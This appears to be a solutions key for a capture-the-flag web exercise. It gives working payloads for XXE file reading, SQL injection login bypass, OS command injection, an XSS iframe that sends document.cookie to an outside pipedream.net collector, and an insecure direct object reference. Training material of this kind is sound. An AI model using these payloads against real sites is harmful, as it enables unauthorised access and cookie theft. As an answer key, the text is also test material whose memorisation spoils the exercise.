Please find below the solutions

1. XXE
Send the login request with the following payload 
 <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:./flag.flg"> ]>
    <userInfo>
     <username>&ent;</username>
     <password>&ent;</password>
    </userInfo>

The user can find that the file is in ./flag.flg because in the original map when clicking on number 9, it asks did you find flag.flg ?
The Flag is then displayed in the answer

2. SQL Injection
Put in the payload ' or true-- instead of username and in the response of the request there is the flag

3. OS Commande injection
In the purchase history, when inputting in the search the payload : 4 && cd .. && ls && cd flag && ls && cat flag.flg

4. XSS
Create a number with the payload 
<iframe src="javascript:fetch('https://en5xeo0nro63l.x.pipedream.net/', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});"></iframe>


5. Direct object reference 
For this one, just download the invoice number 7 
https://frontend-map-numbers.azurewebsites.net/invoice/Invoice_number7
there is no authentication here
The user can find it because on the original numbers, number 7 says who put me there ?
